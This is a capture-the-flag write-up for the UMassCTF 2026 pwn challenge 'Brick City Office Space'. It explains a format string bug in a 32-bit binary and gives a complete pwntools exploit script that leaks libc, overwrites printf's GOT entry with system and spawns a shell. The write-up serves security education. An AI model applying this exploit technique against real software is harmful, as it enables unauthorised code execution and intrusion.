---
layout: post
title: Brick City Office Space Writeup - UMassCTF 2026
tags: competition ctf pwn writeup
authors:
- ljd98
- aeh252
pretty-date: 12 April, 2026
excerpt: Brick City Office Space Writeup from UMassCTF 2026
---

## Description

Help design the office space for Brick City's new skyscraper! read flag.txt for design specifications

## Files

- `BrickCityOfficeSpace`: The vulnerable 32-bit target executable
- `ld-linux.so.2`: The 32-bit dynamic linker
- `libc.so.6`: The specific C standard library used on the target server
- `flag.txt`: The goal file containing the flag

## Initial Observations

- The presence of `ld-linux.so.2` and `libc.so.6` immediately indicated a 32-bit environment
- The program prompts for input ("Send your design as ASCII art") with a stated limit of "592 bricks," indicating a large buffer for payloads
- The input `AAAA.%p.%p.%p...` successfully leaked stack memory, confirming a format string vulnerability
  - Our test string `0x41414141` appeared at the 4th position
- No PIE and no RELRO, meaning the Global Offset Table (GOT) was writable and at a static address

## Vulnerability Analysis

### Where is the bug?

The function responsible for printing the user's submitted ASCII art design back to the terminal

### Why does it exist?

The user-controlled input buffer is passed directly to a print function without using a format specifier

### What primitives does it give you?

Arbitrary read and write

## Exploitation Strategy

- Send a payload containing the GOT address of `printf` followed by `%4$s`. This forces the program to print the real, runtime memory address of `printf` from the dynamically loaded libc
- Subtract the static `printf` offset (found in `libc.so.6`) from our leaked address to calculate the `libc` base address. Then, add the static offset of `system` to find its real memory address
- Use `fmtstr_payload` to overwrite the GOT entry for `printf` with the newly calculated address of `system`
- On the final iteration of the loop, send the string `/bin/sh`. The program will attempt to call `printf("/bin/sh")`, but because the GOT was hijacked, it will execute `system("/bin/sh")` instead, granting an interactive shell
- Run `cat flag.txt` in the interactive shell to print the flag to the terminal

## Full Exploit Script

```py
from pwn import *

# Set up logging to catch I/O hangs
context.log_level = 'debug' 

# Set up the environment
context.binary = elf = ELF('./BrickCityOfficeSpace')
libc = ELF('./libc.so.6') 

io = remote("brick-city-office-space.pwn.ctf.umasscybersec.org", 45001)

# Loop 1: leak
io.recvuntil(b"BrickCityOfficeSpace> ") 

# Payload: Read the real memory address stored inside printf's GOT entry
printf_got = elf.got['printf'] 
leak_payload = p32(printf_got) + b"%4$s"

io.sendline(leak_payload)
io.recvuntil(p32(printf_got)) 
printf_leak = u32(io.recv(4)) 

log.success(f"Leaked printf address: {hex(printf_leak)}")

# Stage 2: math
libc.address = printf_leak - libc.symbols['printf']
log.success(f"Libc Base: {hex(libc.address)}")

system_addr = libc.symbols['system']
log.success(f"System address: {hex(system_addr)}")

# Trigger the next loop
io.sendlineafter(b"(y/n)", b"y") 

# Loop 2: overwrite
io.recvuntil(b"BrickCityOfficeSpace> ")

# Use pwntools to automatically generate the complex %n payload
# offset=4, write the system_addr into printf_got
overwrite_payload = fmtstr_payload(4, {printf_got: system_addr})
io.sendline(overwrite_payload)

# Trigger the final loop
io.sendlineafter(b"(y/n)", b"y")

# Loop 3: pop shell
io.recvuntil(b"BrickCityOfficeSpace> ")

# The GOT is now hijacked. printf is now system.
io.sendline(b"/bin/sh")

# Drop to interactive mode to interact with the shell
io.interactive()
```

## Demo / Output

![Terminal screenshot of exploit script run](/assets/images/ctf-writeups/umassctf26/brickcityofficespace.png)

## Key Takeaways

### Vulnerability class

Format String Vulnerability

### What you'd do differently or what tripped you up?

I/O synchronization with pwntools caused the exploit script to hang initially
